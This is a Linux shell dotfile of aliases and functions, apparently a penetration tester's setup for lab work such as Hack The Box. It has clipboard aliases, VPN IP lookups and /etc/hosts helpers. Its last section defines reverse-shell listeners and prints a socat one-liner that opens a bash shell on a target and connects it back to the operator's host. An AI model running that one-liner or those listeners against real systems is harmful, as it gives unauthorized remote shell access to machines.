# Linux-specific aliases / functions

# Clipboard: prefer wl-copy/wl-paste (Wayland), fall back to xclip (X11)
if command -v wl-copy >/dev/null 2>&1; then
    alias clip='wl-copy'
    alias pbcopy='wl-copy'
    alias pbpaste='wl-paste'
elif command -v xclip >/dev/null 2>&1; then
    alias clip='xclip -selection clipboard'
    alias pbcopy='xclip -selection clipboard'
    alias pbpaste='xclip -selection clipboard -o'
fi

# IP via `ip` — functions for cleaner quoting than aliases
vpnip()  { ip -4 -o addr show 2>/dev/null | awk '/tun[0-9]+/ {split($4,a,"/"); print a[1]; exit}'; }
htbip()  { ip -4 -o addr show 2>/dev/null | awk '/tun[0-9]+/ && /10\.10\./ {split($4,a,"/"); print a[1]; exit}'; }
htbipc() { local ip; ip="$(htbip)"; [ -n "$ip" ] && printf '%s' "$ip" | clip; printf '%s\n' "$ip"; }
localip() { ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1); exit}}'; }

# /etc/hosts helpers — sudo required
hostadd() {
  [ $# -lt 2 ] && { echo "usage: hostadd <ip> <host> [more-hosts...]"; return 1; }
  local ip="$1"; shift
  local line="$ip $*"
  if grep -qE "^[^#]*[[:space:]]$1([[:space:]]|$)" /etc/hosts 2>/dev/null; then
    echo "host already present, replacing:"
    sudo sed -i "/[[:space:]]$1\([[:space:]]\|$\)/d" /etc/hosts
  fi
  echo "$line" | sudo tee -a /etc/hosts >/dev/null && echo "+ $line"
}

hostrm() {
  [ -z "$1" ] && { echo "usage: hostrm <host>"; return 1; }
  sudo sed -i "/[[:space:]]$1\([[:space:]]\|$\)/d" /etc/hosts && echo "- $1"
}

# reverse-shell listeners
# socat PTY listener — tab, vim, ^C all work on catch
pwnshell() {
  local port="${1:-4444}"
  local ip; ip="$(htbip)"
  echo "[*] listening on :$port (socat PTY)"
  echo "[*] target one-liner:"
  echo "    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip:-<htbip>}:$port"
  socat file:"$(tty)",raw,echo=0 tcp-listen:"$port"
}

# nc fallback for when target lacks socat
pwnnc() {
  local port="${1:-4444}"
  echo "[*] listening on :$port (rlwrap nc)"
  rlwrap nc -lvnp "$port"
}
